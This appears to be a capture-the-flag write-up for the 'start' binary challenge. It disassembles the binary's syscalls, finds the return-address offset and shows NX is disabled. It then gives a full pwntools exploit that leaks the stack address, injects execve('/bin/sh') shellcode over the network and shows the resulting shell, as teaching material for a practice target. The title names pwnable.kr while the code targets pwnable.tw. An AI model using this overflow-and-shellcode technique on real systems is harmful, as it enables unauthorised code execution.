---
title: START Pwnable.kr challenge writeup
author: kaki-epithesi
featured-img: bin-exp
categories: [Writeup,Binary Exploitation]
tags: [syscalls,assembly,pwntools]
---


**Lets look at the file.**
```bash
root@kali:~/rev/pwanable/start# file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```
**lets run the binary**

```bash
root@kali:~/rev/pwanable/start# ./start
Let's start the CTF:ok
root@kali:~/rev/pwanable/start#
```
**let's analyse the binary with gdb**

```bash
root@kali:~/rev/pwanable/start# gdb -q ./start
Reading symbols from ./start...
(No debugging symbols found in ./start)
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
gdb-peda$
```

**clearly its a hand written asm code**

```bash
gdb-peda$ disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret    
End of assembler dump.
gdb-peda$ 
```
**clearly it is having 2 syscalls a write and a read**

**WRITE SYSCALL**

If u see the man page of write ($ man 2 write)

ssize_t write(int fd, const void *buf, size_t count)

As the sequence of registers eax,ebx,ecx,edx.

->eax will have the value of syscall number.

->ebx will have the file descriptor(think its used 1)

->ecx will have the pointer to the buffer

->edx will have the size of the buffer

Now look below ecx is given some value from the stack

dl is the 1st 8 byte of edx register which is moved to a value of 0x14 or 20

bl is the 1st 8 byte of ebx register which is having a value of 0x1

al is the 1st 8 byte of eax register which is set to 0x4 (write syscall number)

```bash
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
```
**READ SYSCALL**

Read the man page. ($ man 2 read)

ssize_t read(int fd, void *buf, size_t count);

->eax will have the value of syscall number.

->ebx will have the file descriptor. (think its used 0)

->ecx will have the pointer to the buffer.

->edx will have the size of the buffer.

ebx is xored with ebx so it has a value 0.

dl is having the size of buffer to be read i.e 0x3c or 60.

al is having the read syscall number , 0x3.

```bash
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
```

**FILE DESCRIPTOR**

why for read fd = 0 and for write fd = 1.

```text
Read from stdin => read from fd 0 : Whenever we write any character from keyboard, it read from stdin through fd 0 and save to file named /dev/tty.

Write to stdout => write to fd 1 : Whenever we see any output to the video screen, it’s from the file named /dev/tty and written to stdout in screen through fd 1.

Write to stderr => write to fd 2 : We see any error to the video screen, it is also from that file write to stderr in screen through fd 2.
```
let us check the offset of eip.

```bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 > /root/rev/pwanable/start/a.txt
root@kali:~#cat rev/pwanable/start/a.txt
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```bash
gdb-peda$ r < a.txt
.
.
.
gdb-peda$ info reg
eax            0x3c                0x3c
ecx            0xffffd314          0xffffd314
edx            0x3c                0x3c
ebx            0x0                 0x0
esp            0xffffd32c          0xffffd32c
ebp            0x0                 0x0
esi            0x0                 0x0
edi            0x0                 0x0
eip            0x37614136          0x37614136
eflags         0x10286             [ PF SF IF RF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x0                 0x0
gdb-peda$ 
```

eip got a value 0f 0x37614136

```bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q 0x37614136
[*] Exact match at offset 20
root@kali:~# 
```
so we can see the offset of eip is 20 , and it has only 1 ret , so it is not exploitable using ROP.

lets look at the checksec of the binary.

```bash
root@kali:~/rev/pwanable/start# pwn checksec ./start
[*] '/root/rev/pwanable/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

As the NX bit is disabled we can use shellcode.

[more about NX bit](https://en.wikipedia.org/wiki/NX_bit)

First we need to find the stack address so we can point eip to it.

as mov ecx,esp; is already there, its helped us a lot.

So if we enhance write syscall again it will read stack pointer address.

so our 1st payload will be

```py
b'A'* 20 + p32(0x08048087)
```
**0x08048087** <+39>:    mov    ecx,esp

it will give us the stack pointer address. we will trigger a read syscall adding a shellcode to it , just simply use execve.

```py
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
```

lets sum it up with a python code.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import remote,p32,u32,asm

def _esp(r):
	address_1 = p32(0x08048087)     
	payload = b'A'*20 + address_1	# ROP GADGET
	r.recvuntil('CTF:')
	r.send(payload)
	esp = u32(r.recv()[:4])
	return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

r = remote('chall.pwnable.tw', 10000)
esp = _esp(r)
payload = b'A'*20  + p32(esp + 20) + shellcode 
r.send(payload)
r.interactive()
```

```bash
root@kali:~/rev/pwanable/start# ./start.py 
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[*] Switching to interactive mode
$ whoami
start
$ cd home/start
$ ls
flag
run.sh
start
```

